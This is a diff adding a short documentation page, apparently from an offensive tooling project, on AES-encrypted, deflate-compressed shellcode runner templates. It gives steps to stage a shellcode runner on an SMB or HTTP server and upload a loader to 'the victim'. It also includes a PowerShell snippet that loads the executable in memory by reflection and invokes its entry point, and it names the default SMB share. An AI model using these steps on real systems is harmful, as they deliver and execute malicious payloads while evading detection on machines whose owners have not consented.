@@ -1,0 +1,24 @@
+---
+title: "AES + Compression"
+description: "AES-encrypted and compressed shellcode runners."
+---
+
+Templates located at `Templates/AES/`:
+- `AES_Deflate_HTTP.cs`
+- `AES_Deflate_SMB.cs`
+
+## Steps
+
+1. Copy a shellcode runner (`XOR` or `Caesar`) to your SMB or HTTP server, rename to `shellcode_runner.exe`
+2. Upload `AES_Deflate_SMB.exe` or `AES_Deflate_HTTP.exe` to the victim
+3. Execute via reflection:
+
+```powershell
+$data=[IO.File]::ReadAllBytes('C:\Users\user\Desktop\AES_Deflate_SMB.exe')
+$ass=[System.Reflection.Assembly]::Load($data)
+$ass.EntryPoint.Invoke($null,@($null))
+```
+
+<Note>
+Default SMB share name is **visualstudio**. Edit line 123 of `Templates/AES/AES_Deflate_SMB.cs` to change it.
+</Note>
